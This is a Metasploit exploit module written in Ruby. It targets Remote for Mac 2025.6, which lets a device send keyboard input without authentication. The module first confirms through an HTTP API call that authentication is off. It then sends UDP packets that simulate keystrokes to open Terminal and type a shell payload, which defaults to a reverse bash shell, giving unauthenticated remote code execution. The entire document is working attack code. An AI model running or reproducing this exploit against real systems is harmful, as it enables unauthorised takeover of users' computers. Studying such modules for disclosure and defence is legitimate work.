require 'json'
require 'socket'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Remote for Mac 2025.6 Unauthenticated UDP Keyboard RCE',
        'Description' => %q{
          This module exploits an unauthenticated remote code execution vulnerability in Remote for Mac 2025.6.
          When the "Allow unknown devices" setting is enabled, it is possible to simulate keyboard input via UDP packets
          without authentication. By sending a sequence of key presses, an attacker can open the Terminal and execute
          arbitrary shell commands, achieving code execution as the current user.

          Tested on macOS Mojave and Ventura.
        },
        'Author' => ['Chokri Hammedi'],
        'License' => MSF_LICENSE,
        'References' => [
          ['URL', 'https://packetstorm.news/files/id/196351/']
        ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, SCREEN_EFFECTS]
        },
        'Platform' => ['unix','osx'],
        'Arch' => ARCH_CMD,
        'Targets' => [['Remote for Mac 2025.6', {}]],
        'DefaultTarget' => 0,
        'DefaultPayload' => 'cmd/unix/reverse_bash',
        'DisclosureDate' => '2025-05-27'
      )
    )

    register_options(
      [
        Opt::RHOSTS(),
        Opt::RPORT(49229),
        OptBool.new('SSL', [true, 'Use SSL for HTTP check', true]),
        OptString.new('TARGETURI', [true, 'Base URI path', '/']),
      ]
    )
  end

  def check_auth_disabled?
    protocol = datastore['SSL'] ? 'https' : 'http'
    vprint_status("Checking authentication on #{protocol}://#{datastore['RHOSTS']}:#{datastore['RPORT']}#{datastore['TARGETURI']}api/getVersion")

    begin
      res = send_request_cgi({
        'method' => 'GET',
        'uri' => normalize_uri(datastore['TARGETURI'], 'api', 'getVersion'),
        'ctype' => 'application/json',
        'ssl' => datastore['SSL'],
        'rport' => datastore['RPORT'],
        'rhost' => datastore['RHOSTS']
      })

      if res&.code == 200
        json = JSON.parse(res.body)
        if json['requires.auth'] == false
          print_good('Authentication is disabled. Target is vulnerable.')
          return true
        else
          print_error('Authentication is enabled. Exploit aborted.')
          return false
        end
      else
        print_error('Unexpected response from target')
        return false
      end
    rescue ::Rex::ConnectionError, JSON::ParserError => e
      print_error("Connection or parsing error: #{e.message}")
      return false
    end
  end

  def exploit
    unless check_auth_disabled?
      fail_with(Failure::NotVulnerable, 'Target requires authentication or is unreachable')
    end

    udp_port = datastore['RPORT']
    target_ip = datastore['RHOSTS']

    initial_packets_hex = [
      '07000200370001',
      '07000200370001',
      '060003002000',
      '07000200370000',
      '07000200370000'
    ]

    final_packets_hex = [
      '07000200240001',
      '07000200240000'
    ]

    udp_sock = UDPSocket.new
    udp_sock.connect(target_ip, udp_port)

    print_status('Simulating system keyboard input to open Terminal...')
    initial_packets_hex.each do |hexpkt|
      udp_sock.send([hexpkt].pack('H*'), 0)
      select(nil, nil, nil, 0.05)
    end

    prefix = [0x06, 0x00, 0x03, 0x00].pack('C*')
    'terminal'.each_char do |ch|
      pkt = prefix + ch.encode('utf-16le').force_encoding('ASCII-8BIT')
      udp_sock.send(pkt, 0)
      select(nil, nil, nil, 0.1)
    end

    final_packets_hex.each do |hexpkt|
      udp_sock.send([hexpkt].pack('H*'), 0)
      select(nil, nil, nil, 0.1)
    end

    sleep(2)

    shell_cmd = payload.encoded
    print_status('Sending malicious payload to be executed...')

    shell_cmd.each_char do |ch|
      pkt = prefix + ch.encode('utf-16le').force_encoding('ASCII-8BIT')
      udp_sock.send(pkt, 0)
      select(nil, nil, nil, 0.1)
    end

    final_packets_hex.each do |hexpkt|
      udp_sock.send([hexpkt].pack('H*'), 0)
      select(nil, nil, nil, 0.1)
    end

    print_good('Payload sent. Awaiting session...')
  ensure
    udp_sock.close if udp_sock
  end
end
